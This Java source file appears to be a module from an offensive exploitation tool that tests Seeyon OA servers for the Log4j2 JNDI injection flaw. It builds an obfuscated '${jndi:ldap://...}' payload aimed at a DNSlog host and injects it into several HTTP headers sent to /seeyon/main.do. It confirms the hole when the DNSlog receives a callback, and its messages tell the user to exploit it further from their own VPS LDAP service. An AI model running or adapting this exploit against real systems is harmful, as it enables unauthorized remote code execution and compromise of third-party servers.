package Exp.OA.seeyonoa;

import Utilss.HttpTools;
import Utilss.Response;
import Utilss.shell;
import core.Exploitlnterface;
import javafx.scene.control.TextArea;
import java.util.HashMap;

public class seeyonoa_main_log4j2 implements Exploitlnterface {
    @Override
    public Boolean checkVul(String url, TextArea textArea) {
        Boolean att = att(url, textArea);
        return att;
    }

    @Override
    public Boolean getshell(String url, TextArea textArea) {
        textArea.appendText("\n log4j2无法getshell  请自行开启ladp服务利用");
        return false;
    }

    private Boolean att(String url,TextArea textArea){
        String log4jpayload = "${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://" + shell.getRandomString() + "." + shell.readFile(shell.dnspath).replace("http://","") + "}";
        HashMap<String,String> head = new HashMap();
        head.put("X-Forwarded-For", log4jpayload);
        head.put("X-Client-IP", log4jpayload);
        head.put("X-Requested-With", log4jpayload);
        head.put("X-Api-Version", log4jpayload);

        Response dns_le1 = HttpTools.get(shell.readFile(shell.dnscofpath), new HashMap<String, String>(), "utf-8");
        int dns_1 = dns_le1.getText().length();

        Response response = HttpTools.get(url + "/seeyon/main.do", head, "utf-8");
        try { Thread.sleep (5000) ;
        } catch (Exception ie){}

        Response dns_le2 = HttpTools.get(shell.readFile(shell.dnscofpath), new HashMap<String, String>(), "utf-8");
        int dns_2 = dns_le2.getText().length();

        if(dns_2 > dns_1 && response.getCode() == 200){
            textArea.appendText("\n log4j2漏洞存在-收到dnslog回显，请使用VPS自行利用");
            return true;
        }else {
            textArea.appendText("\n seeyonoa_main_log4j2-RCE-漏洞不存在 (出现误报请联系作者)");
            return false;
        }

    }
}
